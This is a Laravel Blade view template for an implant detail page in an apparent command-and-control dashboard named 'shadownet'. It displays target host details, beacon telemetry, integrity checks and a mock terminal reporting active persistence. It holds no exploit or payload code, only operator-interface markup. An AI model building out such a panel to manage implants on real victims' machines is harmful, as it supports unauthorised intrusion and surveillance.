@extends('layouts.app')

@section('title', $implant['hostname'])

@section('content')
<div style="margin-bottom: 20px;">
    <a href="{{ route('dashboard') }}" style="color: #666; text-decoration: none; font-size: 0.85em;">
        &larr; Back to Dashboard
    </a>
</div>

<div class="grid grid-3" style="margin-bottom: 30px;">
    <div class="panel">
        <div class="panel-header">
            <span class="panel-title">Implant ID</span>
        </div>
        <div class="panel-body">
            <div style="font-size: 0.75em; color: #00ccff; word-break: break-all;">
                {{ $implant['id'] }}
            </div>
        </div>
    </div>
    <div class="panel">
        <div class="panel-header">
            <span class="panel-title">Status</span>
        </div>
        <div class="panel-body">
            <span class="badge badge-{{ $implant['status'] }}" style="font-size: 1em;">{{ strtoupper($implant['status']) }}</span>
        </div>
    </div>
    <div class="panel">
        <div class="panel-header">
            <span class="panel-title">Version</span>
        </div>
        <div class="panel-body">
            <span style="color: #00ff88;">{{ $implant['implant_version'] }}</span>
        </div>
    </div>
</div>

<div class="grid grid-2">
    <div>
        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Target Information</span>
            </div>
            <div class="panel-body">
                <table class="data-table">
                    <tr>
                        <td style="color: #666; width: 40%;">Hostname</td>
                        <td>{{ $implant['hostname'] }}</td>
                    </tr>
                    <tr>
                        <td style="color: #666;">Operating System</td>
                        <td>{{ $implant['os'] }}</td>
                    </tr>
                    <tr>
                        <td style="color: #666;">Internal IP</td>
                        <td>{{ $implant['ip'] }}</td>
                    </tr>
                    <tr>
                        <td style="color: #666;">Last Beacon</td>
                        <td>{{ \Carbon\Carbon::parse($implant['last_beacon'])->format('Y-m-d H:i:s') }} UTC</td>
                    </tr>
                </table>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Integrity Verification</span>
            </div>
            <div class="panel-body">
                <table class="data-table">
                    <tr>
                        <td style="color: #666; width: 50%;">Checksum Valid</td>
                        <td>
                            @if($integrity['checksum_valid'])
                                <span style="color: #00ff88;">VERIFIED</span>
                            @else
                                <span style="color: #ff4444;">FAILED</span>
                            @endif
                        </td>
                    </tr>
                    <tr>
                        <td style="color: #666;">Signature</td>
                        <td>
                            @if($integrity['signature_verified'])
                                <span style="color: #00ff88;">VERIFIED</span>
                            @else
                                <span style="color: #ff4444;">INVALID</span>
                            @endif
                        </td>
                    </tr>
                    <tr>
                        <td style="color: #666;">Last Verification</td>
                        <td style="color: #888;">{{ \Carbon\Carbon::parse($integrity['last_verification'])->diffForHumans() }}</td>
                    </tr>
                    <tr>
                        <td style="color: #666;">Next Scheduled</td>
                        <td style="color: #888;">{{ \Carbon\Carbon::parse($integrity['next_scheduled'])->diffForHumans() }}</td>
                    </tr>
                </table>
            </div>
        </div>
    </div>

    <div>
        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Beacon Telemetry</span>
                <span style="color: #666; font-size: 0.8em;">Last 3 reports</span>
            </div>
            <div class="panel-body" style="padding: 0;">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>CPU</th>
                            <th>MEM</th>
                            <th>NET ↓</th>
                            <th>NET ↑</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($telemetry as $entry)
                        <tr>
                            <td style="color: #666;">{{ \Carbon\Carbon::parse($entry['timestamp'])->format('H:i') }}</td>
                            <td>{{ $entry['cpu'] }}%</td>
                            <td>{{ $entry['memory'] }}%</td>
                            <td style="color: #00ccff;">{{ $entry['network_in'] }}</td>
                            <td style="color: #ffcc00;">{{ $entry['network_out'] }}</td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Command Queue</span>
            </div>
            <div class="panel-body terminal-output">
<span class="prompt">shadownet@c2:~$</span> status --implant {{ substr($implant['id'], 0, 8) }}
[OK] Implant responding
[OK] Persistence mechanism active
[OK] No pending commands

<span class="prompt">shadownet@c2:~$</span> _</div>
        </div>
    </div>
</div>
@endsection
